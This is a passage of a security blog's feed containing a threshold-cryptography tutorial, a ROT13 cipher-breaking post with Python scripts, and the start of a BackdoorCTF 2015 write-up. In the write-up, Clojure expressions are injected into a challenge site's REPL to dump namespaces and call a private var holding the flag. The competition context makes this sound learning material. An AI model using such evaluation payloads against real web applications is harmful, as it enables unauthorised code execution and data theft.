+<p><strong>Proof</strong>:</p>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-9.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><strong>Example:</strong></p>
+<p>Let p=47 and q=59, then N=pq=2773 and (p-1)(q-1)=2668. Assume e=17, we can calculate the value for d with 17d=1(mod 2668) or d=157. Each party Pi knows the tuple &lt; p<sub>i</sub>, q<sub>i</sub>, d<sub>i </sub>&gt; : &lt;13,19,61&gt;, &lt;11,23,53&gt;, &lt;23,17,43&gt; respectively where p = 47 =13+11+23 ; q=59=19+23+17; and d=157=61+53+43. If the message is ready for the encryption is represent by m=9, then calculation of the ciphertext yields: <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-10.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> .</p>
+<p>Decipherment of the text requires knowledge of <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-11.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> from all parties then it follows that:</p>
+<p>M <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-12.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-13.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-14.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-15.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> =9, which is the original message.</p>
+<p><strong>2.2. Shamir’s Secret Sharing Scheme and Lagrange Coefficient</strong></p>
+<p>A trusted dealer has a secret s and chooses a large prime number p &gt; n, the number of parties. Unless otherwise stated, all arithmetic operations are done modulo p. The dealer picks a<sub>1</sub>, …, a<sub>t−1 </sub>uniformly random from Z𝑝 and defines P(x) = <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-16.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Party Pi gets share s<sub>i</sub>= P(i) privately from the dealer. To reconstruct the secret <em>s</em>, any <em>t</em> parties come together. They can recover the secret by solving the system of linear equations: <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-17.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . We can also denote <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-18.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> .</p>
+<p><strong>Proof</strong>:</p>
+<p>Larrange interpolation over <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-19.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> with <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-20.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><strong>Example</strong>:</p>
+<p>Shamir’s threshold (3,4) over Z<sub>7</sub>:</p>
+<p><em>Distribution: </em>Dealer has secret s=4 and picks <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-21.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Hence, polynomial <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-22.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Dealer sends s<sub>1</sub>=4 to P<sub>1</sub>, s<sub>2</sub>=0 to P<sub>2</sub>, s<sub>3</sub>=6 to P<sub>1</sub>, s<sub>4</sub>=1 to P<sub>4</sub>.</p>
+<p><em>Reconstruction: </em>When P<sub>1</sub>, P<sub>3</sub> and P<sub>4</sub> come together, we have:</p>
+<p><em>s</em> = <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-23.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-24.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-25.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> 4</p>
+<p><strong>2.3. Threshold ElGamal based on Shamir’s Secret Sharing Scheme </strong></p>
+<p>2.3.1 Threshold ElGamal scheme</p>
+<p>Similarly to traditional ElGamal encryption scheme, in threshold ElGamal, we have the public components are (p,g,h) and private key <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-26.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> in threshold environment. The dealer picks a<sub>1</sub>, …, a<sub>t−1 </sub>uniformly random from Z𝑝 and defines P(x) = <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-27.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Party Pi gets share s<sub>i</sub>= P(i) privately from the dealer. This scheme of both construction and reconstruction of the secret is similar to the previous scheme based on Shamir’s Lagrange.</p>
+<p><strong>Example</strong>: public key (23, 5, 8) and private key = 6 in a (3,5)-threshold scheme [6].</p>
+<ul>
+<li><em>Standard ElGamal encryption</em> with message m and public key.</li>
+</ul>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-28.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<ul>
+<li><em>Decryption</em></li>
+</ul>
+<p>Trusted dealer and every party can receive cipher = (B, c). Assume 3 parties {2,4,5} meet together to compute decryption share:</p>
+<p><img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-29.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-30.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-31.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p><img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-32.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-33.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>Trusted dealer computes <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-34.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> using Shamir’s Lagrange: <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-35.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Then compute <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-36.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>However, this scheme still requires a trusted third party (dealer) which is the most disadvantage when being compromised. Broadcasting partial secret information is used to avoid this problem using distributed key generation (DKG) as follow:</p>
+<ul>
+<li>Each party acts as dealer picks a<sub>1</sub>, …, a<sub>t−1 </sub>uniformly random from Z𝑝 and defines P<sub>i</sub>(x) = <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-37.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Party Pi sends s<sub>i,j</sub>= P<sub>i</sub>(j) privately to party P<sub>j</sub>. All parties compute their secret key share: <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-38.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . And secret key <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-39.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> .</li>
+<li>To decrypt a given ciphertext (c<sub>1</sub>,c<sub>2</sub>). Let <em>Q </em>be any subgroup of size <em>t</em>, for example {P<sub>1</sub>,…,P<sub>t</sub>}. Each party P<sub>j</sub> of Q broadcast <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-40.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> then compute <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-41.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Thereafter, compute <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-42.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> .</li>
+</ul>
+<p>It is easy to prove that nobody can gain information about <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-43.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> , however there is no verification if parties deviate from this scheme. In general, verifiable secret sharing ensures that even if the dealer is malicious there is a well-defined secret that the players can later reconstruct while in standard secret sharing, the dealer is assumed to be trusted. The concept of verifiable secret sharing (VSS) was first introduced in [7]. Therefore, I am going to show you two schemes to verify secret sharing: Feldman’s VSS scheme.</p>
+<p>2.3.2 Threshold El-Gamal based on DKG and Feldman’s Verifiable Secret Sharing</p>
+<p>Each party <em>P<sub>i</sub></em> picks a<sub>i,1</sub>, …, a<sub>i,t−1 </sub>uniformly random from Z𝑝 in given group <em>G = &lt;g&gt; </em>of order <em>p </em>and defines P<sub>i</sub>(x) = <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-44.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Party Pi shares s<sub>i,j</sub>= P<sub>i</sub>(j) privately to party P<sub>j</sub> and broadcasts <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-45.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> and <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-46.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Hence all parties P<sub>j</sub> can check own share: <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-47.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> , compute key share: <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-48.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> and compute verification key of P<sub>i </sub>: <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-49.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>To decrypt a given ciphertext (c<sub>1</sub>,c<sub>2</sub>). Let <em>Q </em>be any subgroup of size <em>t</em>, for example {P<sub>1</sub>,…,P<sub>t</sub>}. Each party P<sub>j</sub> of Q broadcast <img src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-50.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> similar to DKG scheme then compute <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-51.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> . Use Zero knowledge proof to prove <img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-52.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> Thereafter, compute <img src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image-53.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /> .[8]</p>
+<ul>
+<li><strong><em>Advantages</em></strong>: It does not require any trusted dealer and still can generate the public/private key pair efficiently with verification process.</li>
+<li><strong><em>Disadvantage</em></strong><em>s</em>: All parties’ identity need to be known to all other parties through every step.</li>
+</ul>
+<p><strong>4.Conclusion</strong></p>
+<p>Different applied schemes using threshold signature scheme is proposed in this report that includes: RSA shared secret, Shamir’s secret sharing, Elgamal threshold scheme, distributed key generation and verification as well as advantages and disadvantages of each scheme.</p>
+<p>-cmxd</p>
+<p><strong>REFERENCES</strong></p>
+<p>[1] A. Shamir. How to share a secret. Communications of the ACM, 22, 612–613, 1979</p>
+<p>[2] C. Boyd. Digital Multisignatures. Cryptography and Coding 1989. Institute of Mathematics and its application, IMA. 241–246, Clarendon Press, 1989</p>
+<p>[3] Y. Frankel. A practical protocol for large group oriented networks. Advances in Cryptology – EUROCRYPT ’89, Springer-Verlag LNCS 434, 56–61, 1989.</p>
+<p>[4] P. Paillier. Public key crypto-systems based on composite residue classes. Advances in Cryptography - EIROCRYPT ’99. Springer-Verlag LNCS 1070, pp. 72-83, 1996.</p>
+<p>[5] H.L. Nguyen, RSA Threshold Cryptograph. University of Bristol, 2005.</p>
+<p>[6] Björn Groneberg, Threshold Cryptography slides. University of Potsdam, 2013.</p>
+<p>[7] Benny Chor, Shafi Goldwasser, Silvio Micali, Baruch Awerbuch. Verifiable secret sharing and achieving simultaneity in the presence of faults, SFCS '85 Proceedings of the 26th Annual Symposium on Foundations of Computer Science p. 383-395,1985.</p>
+<p>[8] Dr. S.J.A. de Hoogh, Threshold Cryptography slides. TU/D, 2014.</p>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">399</post-id>	</item>
+		<item>
+		<title>Deciphering Ceasar basic concept</title>
+		<link>https://babyphd.net/2016/03/08/deciphering-ceasar-basic-concept/</link>
+				<pubDate>Tue, 08 Mar 2016 17:15:10 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[crypto]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=379</guid>
+				<description><![CDATA[Deciphering &#160; Ciphertext: “VaqrprzoreoeratraWhyvhfraJnygreUbyynaqreqrgjrroebrefinaRqvguZnetbganne NzfgreqnzNaarjvytenntzrrxbzraznnezbrgabtrrarragvwqwrovwbzn oyvwiraBznmnyurgzbrvyvwxuroorabzNaarabtrracnnejrxraqnnegrubhqrafpuev wsgRqvguSenaxvarraoevrsnnaTregehqAnhznaauhaiebrtrerohhezrvfwrvaSenaxs hegnzZnva” The given ciphertext has only letters without space, punctuation or separated key, there are two classic cipher systems such as substitution cipher and transposition cipher which are known to be easy to attack by using frequency analysis or bruteforce techniques. 1. Bruteforce Firstly, it is suggested that &#8230; <a href="https://babyphd.net/2016/03/08/deciphering-ceasar-basic-concept/" class="more-link">Continue reading <span class="screen-reader-text">Deciphering Ceasar basic concept</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<p><strong>Deciphering</strong></p>
+<p>&nbsp;</p>
+<table>
+<tbody>
+<tr>
+<td>Ciphertext: “<em>VaqrprzoreoeratraWhyvhfraJnygreUbyynaqreqrgjrroebrefinaRqvguZnetbganne</em></p>
+<p><em>NzfgreqnzNaarjvytenntzrrxbzraznnezbrgabtrrarragvwqwrovwbzn </em></p>
+<p><em>oyvwiraBznmnyurgzbrvyvwxuroorabzNaarabtrracnnejrxraqnnegrubhqrafpuev</em></p>
+<p><em>wsgRqvguSenaxvarraoevrsnnaTregehqAnhznaauhaiebrtrerohhezrvfwrvaSenaxs</em></p>
+<p><em>hegnzZnva</em>”</td>
+</tr>
+</tbody>
+</table>
+<p>The given ciphertext has only letters without space, punctuation or separated key, there are two classic cipher systems such as substitution cipher and transposition cipher which are known to be easy to attack by using frequency analysis or bruteforce techniques.<span id="more-379"></span></p>
+<p><strong>1. Bruteforce</strong></p>
+<p>Firstly, it is suggested that some sorts of simple substitution cipher has been used and Ceasar cipher is one of the most popular and simplest known encryption techniques. This encryption can be represented by aligning two alphabets; the ciphertext is the plain alphabet rotated left or right by some numbers of positions. It can be represented using modular arithmetic as well by first converting the letters into numbers such as A = 0, B = 1,..., Z = 25. Encryption of a letter <em>x</em> by a shift <em>n</em> can be described as E(x)=(x+n)mod 26 and the decryption is similarly D(x)=(x-n) mod 26. One way to break this is printing out all results with possible shifts of ciphertext by using bruteforce where the shift ranges from 1 to 26 (assuming they are only lower/uppercase letters in ASCII table). By using the Python program [1], there is a readable output as follow:</p>
+<p><img src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/03/word-image.png?w=604&#038;ssl=1" alt="" data-recalc-dims="1" /></p>
+<p>This result is in Dutch language and it means: “<em>In December, bringing Juliusen Walter Hollander's two brothers Edith Margot to Amsterdam Anne would like to come but it must no be zero in some time with Grandma Omazal have tired of hard-to for Anne no no few weeks to keep writes Edith Frank Smash letter to Gertrud Naumann, their former neighbor in Frankfurtam Main</em>”.</p>
+<p><strong>2. Frequency analysis</strong></p>
+<p>By analysing the frequency of ciphertext’s letters, and by knowing the expected distribution of letters in the original language of the plaintext, we can easily decipher substitution ciphertext by trying several combinations of mappings between ciphertext and plaintext letters based on the statistic. The letter frequency of the given ciphertext was derived by using the script [2] which shows the most frequently used letter: “R”. Given that the plaintext is in English, Dutch, German or Turkish, and there are many published frequency result extracted from common books such as: “<em>etaoinsrhldcumfpgwybvkxjqz</em>”, “<em>enatirodslghvkmubpwjczfxy(ëéó)q</em>”, “<em>enisratdhulcgmobw fkzvüpäßjöyqx</em>”, and “<em>aeinrlıdkmuytsboüşzgçhğvcöpfjwxq</em>” respectively<sup><a id="post-379-footnote-ref-1" href="#post-379-footnote-1">[1]</a></sup>.</p>
+<p>In substituting the letters appeared the most in ciphertext by letters from those result above, I recognize the language of plaintext must be in Dutch. Because after replacing 2 most frequently used Dutch letter R, A in ciphertext with E, N respectively, I found out that the 3-letter-word “<em>een</em>” <em>(</em>means “<em>a</em>” in English) appeared with high frequency and this word is one of the most popular Dutch words<sup><a id="post-379-footnote-ref-2" href="#post-379-footnote-2">[2]</a></sup>. Keep replacing others based on the popular Dutch frequency letter with some guessing as described in [3], we get the final text which is similar to the first result.</p>
+<p><strong>3.Encryption algorithm improvements</strong></p>
+<p><strong>Method 1:</strong></p>
+<p>This encryption can be improved by rotating left or right each letters by different numbers of positions. Firstly we convert the letters into numbers such as A = 0, B = 1,.., Z = 25. Encryption of a letter <em>x<sub>i</sub></em> can be described as E(x_i )=(x_i+n*i)mod 26 and the decryption is similarly D(x_i )=(x_i-n*i) mod 26 where <em>i</em> is the letter’s position in plaintext or ciphertext. It will be difficult for attackers to use frequency analysis without knowing the encipher method and number n. An example of n=2 is described in [4].</p>
+<p><strong>Method 2:</strong></p>
+<p>This encryption can be improved by substituting each letters with a pseudo-random generated array of letters. Given an alphabet array consisting of uppercase and lowercase letters:</p>
+<p>[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z]</p>
+<p>We shuffle this array by initializing a basic random generator with a <em>seed</em> number which can be the key or the time when this text was enciphered, then we have a Pseudo-random Array (PRA). We convert the letters into numbers such as A = 0, B = 1,.., Z = 25. Encryption of a letter <em>x</em> can be described as and the decryption is similarly where <em>index</em> is a function shows the letter’s position in array. The result consists of random uppercase or lowercase letters independent of plaintext. It will be difficult for attacker to use frequency analysis despite knowing the encipher method, however attackers can still bruteforce the <em>seed</em> if they know initial array’s order and a small value of <em>seed</em> was implemented. An example of <em>seed</em>=0xFFFFFFF is described in [5].</p>
+<p><strong>However, I've got a question for viewers: <em>Do you think this kind of encryption seems tobe complex but it can still be beaten by simple substitution cipher analysis?</em></strong></p>
+<p><strong>4. Conclusion</strong></p>
+<p>ROT13 is used in this encipher method with replaces a letter with other 13 letters after it in the alphabet. It can be easily broken even in a ciphertext-only scenario by using bruteforce and frequency analysis.</p>
+<p>&nbsp;</p>
+<p>-cmxd</p>
+<p><strong>APPENDIX</strong></p>
+<p><strong>[1]</strong></p>
+<pre class="lang:default decode:true ">import string
+ciphertext = 'VaqrprzoreoeratraWhyvhfraJnygreUbyynaqreqrgjrroebrefinaRqvguZnetbganneNzfgreqnzNaarjvytenntzrrxbzraznnezbrgabtrrarragvwqwrovwbznoyvwiraBznmnyurgzbrvyvwxuroorabzNaarabtrracnnejrxraqnnegrubhqrafpuevwsgRqvguSenaxvarraoevrsnnaTregehqAnhznaauhaiebrtrerohhezrvfwrvaSenaxshegnzZnva'
+for i in range(0,26):
+    plaintext = ''
+    for c in ciphertext:
+        if c in string.uppercase:
+            newpos = string.uppercase.find(c)+i
+            if newpos&gt;25 : newpos -= 26
+            plaintext += string.uppercase[newpos]
+        if c in string.lowercase:
+            newpos = string.lowercase.find(c)+i
+            if newpos&gt;25 : newpos -= 26
+            plaintext += string.lowercase[newpos]
+    print "Shift:"+str(i)+" : "+plaintext</pre>
+<p>&nbsp;</p>
+<p><strong>[2]</strong></p>
+<ol>
+<li>
+<pre class="lang:default decode:true "># -*- coding: utf-8 -*-
+import collections, string
+cipher = 'VAQRPRZOREOERATRAWHYVHFRAJNYGREUBYYNAQREQRGJRROEBREFINARQVGUZNETBGANNENZFGREQNZNAARJVYTENNTZRRXBZRAZNNEZBRGABTRRARRAGVWQWROVWBZNOYVWIRABZNMNYURGZBRVYVWXUROORABZNAARABTRRACNNEJRXRAQNNEGRUBHQRAFPUEVWSGRQVGUSENAXVARRAOEVRSNNATREGEHQANHZNAAUHAIEBRTREROHHEZRVFWRVASENAXSHEGNZZNVA'
+dem = [[0, chr(i + ord('A'))] for i in range(26)]
+for ch in cipher:
+    if ch not in string.uppercase:
+        continue
+    dem[ord(ch) - ord('A')][0] += 1
+count = {}
+dem.sort()
+dem = dem[::-1]
+print "Letter Frequency: ", dem
+for ch in [cipher[i:i+2] for i in xrange(0, len(cipher)-1)]:
+    if (not count.get(ch)):
+        count[ch]=1
+    else:
+        count[ch]+=1
+print "2 letters Frequency: ", collections.OrderedDict(sorted(count.items(), key=lambda t: t[1]))
+count = {}
+for ch in [cipher[i:i+3] for i in xrange(0, len(cipher)-2)]:
+    if (not count.get(ch)):
+        count[ch]=1
+    else:
+        count[ch]+=1
+print "3 letters Frequency: ",  collections.OrderedDict(sorted(count.items(), key=lambda t: t[1]))</pre>
+<p>&nbsp;</li>
+</ol>
+<p><strong>[3]</strong></p>
+<ol>
+<li>
+<pre class="lang:default decode:true ">a = {}
+# #e n a t i r o d s l g h v k m u b p w j c z f x y (e e o) q DUTCH
+#e n a r m i t o d u b l j h g s k f w v c z p y x q
+a['R'] = 'E'
+a['A'] = 'N'
+a['N'] = 'A'
+a['E'] = 'R'
+a['Z'] = 'M'
+a['V'] = 'I'
+a['G'] = 'T'
+a['B'] = 'O'
+a['Q'] = 'D'
+a['O'] = 'B'
+a['H'] = 'U'
+a['Y'] = 'L'
+a['W'] = 'J'
+a['U'] = 'K'
+a['T'] = 'G'
+a['X'] = 'U'
+a['S'] = 'F'
+a['F'] = 'S'
+a['J'] = 'W'
+a['I'] = 'V'
+a['P'] = 'C'
+a['M'] = 'Z'
+a['C'] = 'P'
+plaintext = ''
+for ch in cipher:
+    if ch in a.keys():
+        plaintext = plaintext + a[ch]
+    else:
+        plaintext = plaintext + '*'
+print plaintext</pre>
+<p>&nbsp;</li>
+</ol>
+<p><strong>[4]</strong></p>
+<ol>
+<li>
+<pre class="lang:default decode:true ">import string
+plaintext="IndecemberbrengenJuliusenWalterHollanderdetweebroersvanEdithMargotnaarAmsterdamAnnewilgraagmeekomenmaarmoetnogeeneentijdjebijomablijvenOmazalhetmoeilijkhebbenomAnnenogeenpaarwekendaartehoudenschrijftEdithFrankineenbriefaanGertrudNaumannhunvroegerebuurmeisjeinFrankfurtamMain"
+ciphertext=""
+for i in range(1,len(plaintext)+1):
+    shift = (2*i%26)
+    if plaintext[i-1] in string.uppercase:
+        newpos = string.uppercase.find(plaintext[i-1])+shift
+        if newpos&gt;25 : newpos -= 26
+        ciphertext += string.uppercase[newpos]
+    elif plaintext[i-1] in string.lowercase:
+        newpos = string.lowercase.find(plaintext[i-1])+shift
+        if newpos&gt;25 : newpos -= 26
+        ciphertext += string.lowercase[newpos]
+print "Ciphertext: ", ciphertext
+#Decipher
+plaintext=""
+for i in range(1,len(ciphertext)+1):
+    shift = (2*i%26)
+    if ciphertext[i-1] in string.uppercase:
+        newpos = string.uppercase.find(ciphertext[i-1])-shift
+        if newpos&lt;0 : newpos += 26
+        plaintext += string.uppercase[newpos]
+    elif ciphertext[i-1] in string.lowercase:
+        newpos = string.lowercase.find(ciphertext[i-1])-shift
+        if newpos&lt;0 : newpos += 26
+        plaintext += string.lowercase[newpos]
+print "Plaintext: ", plaintext</pre>
+<p>&nbsp;</li>
+</ol>
+<p><strong>[5]</strong></p>
+<ol>
+<li>
+<pre class="lang:default decode:true ">import random
+def random_encipher(string,seed):
+   random.seed(seed)
+   alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
+   random.shuffle(alphabet)
+   ciphers = ""
+   for letter in string:
+    if ord(letter) &gt;=97:
+       index = ord(letter)-97
+       cipher = alphabet[index]
+       ciphers+=cipher
+    else:
+       index = ord(letter)-65
+       cipher = alphabet[26+index]
+       ciphers+=cipher
+   return ciphers
+def random_decipher(string,seed):
+   random.seed(seed)
+   alphabet = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
+   random.shuffle(alphabet)
+   plaintext = ""
+   for letter in string:
+    index=alphabet.index(letter)
+    if index &gt;=26:
+       plaintext += chr(65+index-26)
+    else:
+       plaintext += chr(97+index)
+   return plaintext
+ciphertext= random_encipher("IndecemberbrengenJuliusenWalterHollanderdetweebroersvanEdithMargotnaarAmsterdamAnnewilgraagmeekomenmaarmoetnogeeneentijdjebijomablijvenOmazalhetmoeilijkhebbenomAnnenogeenpaarwekendaartehoudenschrijftEdithFrankineenbriefaanGertrudNaumannhunvroegerebuurmeisjeinFrankfurtamMain",0xFFFFFFF )
+print "Ciphertext: ", ciphertext
+print "Plaintext: ",random_decipher(ciphertext, 0xFFFFFFF )</pre>
+<p>&nbsp;</li>
+</ol>
+<ol>
+<li id="post-379-footnote-1">http://www.letterfrequency.org <a href="#post-379-footnote-ref-1">↑</a></li>
+<li id="post-379-footnote-2">https://en.wiktionary.org/wiki/Wiktionary:Frequency_lists#Dutch <a href="#post-379-footnote-ref-2">↑</a></li>
+</ol>
+]]></content:encoded>
+									<post-id xmlns="com-wordpress:feed-additions:1">379</post-id>	</item>
+		<item>
+		<title>BackdoorCTF Writeup</title>
+		<link>https://babyphd.net/2015/04/03/backdoorctf-writeup/</link>
+				<comments>https://babyphd.net/2015/04/03/backdoorctf-writeup/#comments</comments>
+				<pubDate>Fri, 03 Apr 2015 06:50:03 +0000</pubDate>
+		<dc:creator><![CDATA[chuymichxinhdep]]></dc:creator>
+				<category><![CDATA[chuymich]]></category>
+		<category><![CDATA[2015]]></category>
+		<category><![CDATA[babyphd]]></category>
+		<category><![CDATA[backdoorCTF]]></category>
+		<category><![CDATA[gaylord]]></category>
+
+		<guid isPermaLink="false">https://babyphd.net/?p=324</guid>
+				<description><![CDATA[backdoor CTF 2015: NONAME Category: Exploit Points: 200 Author: Amanpreet Singh Difficulty: Solves: 25 Description: https://backdoor.sdslabs.co/challenges/NONAME Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can't get the flag. Can you? Visit this. Submit the SHA-256 hash of the flag obtained. Gaylord : At first, (str (all-ns)) to &#8230; <a href="https://babyphd.net/2015/04/03/backdoorctf-writeup/" class="more-link">Continue reading <span class="screen-reader-text">BackdoorCTF Writeup</span> <span class="meta-nav">&#8594;</span></a>]]></description>
+								<content:encoded><![CDATA[<h1>backdoor CTF 2015: <a href="https://backdoor.sdslabs.co/challenges/NONAME">NONAME</a></h1>
+<p><strong>Category:</strong> Exploit <strong>Points:</strong> 200 <strong>Author:</strong> <a href="https://backdoor.sdslabs.co/users/apsdehal">Amanpreet Singh</a> <strong>Difficulty:</strong> <strong>Solves:</strong> 25 <strong>Description:</strong></p>
+<ul class="task-list">
+<li><a href="https://backdoor.sdslabs.co/challenges/NONAME">https://backdoor.sdslabs.co/challenges/NONAME</a></li>
+</ul>
+<blockquote><p>Intrestingly enough, even though it was not expected, Chintu found a cool website to play with, though he can't get the flag. Can you? Visit <a href="https://agile-garden-1672.herokuapp.com/">this</a>. Submit the SHA-256 hash of the flag obtained.</p>
+<p style="text-align: left;">
+</blockquote>
+<p>Gaylord : At first, (str (all-ns)) to get all namespaces. And then (clojure.repl/dir noname.people.admin) to see what inside. There is including flag and secret. Used (noname.people.admin/flag) to get the  a half of the flag.</p>
+<p>Chuymichxinhdep: However secret is a private variable variable, I used ((noname.people.admin/secret)) to obtain the other half of the flag. Problem solved.</p>
+<h1>backdoor CTF 2015: <a href="https://backdoor.sdslabs.co/challenges/QR">QR</a></h1>
+<p><strong>Category:</strong> Misc <strong>Points:</strong> 70 <strong>Author:</strong> <a href="https://backdoor.sdslabs.co/users/nemo">Abhay Bir Singh Rana</a> <strong>Difficulty:</strong> Easy <strong>Solves:</strong> 84 <strong>Description:</strong></p>
+<ul class="task-list">
+<li><a href="https://backdoor.sdslabs.co/challenges/QR">https://backdoor.sdslabs.co/challenges/QR</a></li>
+</ul>
+<blockquote><p>Decode some QR codes at <code>nc hack.bckdr.in 8010</code></p>
+<p>&nbsp;</p></blockquote>
+<p>chuymichxinhdep:</p>
+<pre class="lang:python decode:true">from subprocess import Popen, PIPE
+i = 0
+import socket
+
+sock = socket.socket()
+sock.connect(("hack.bckdr.in", 8010))
+s= sock.recv(1024)
+print(s)
+while True:
+	i=i+1
+	string = ""
+	s= sock.recv(65535)
+	data= s.replace("\x20\x20","0").replace("\xe2\x96\x88\xe2\x96\x88","1")
+	file = open('qr','w')
+	for line in data.split("\n"):
+		string = string+line[1:len(line)-1]+"0"*(47-len(line))+"\n"
+	file.write(string[46:len(string)-1-46])
+	file.close()
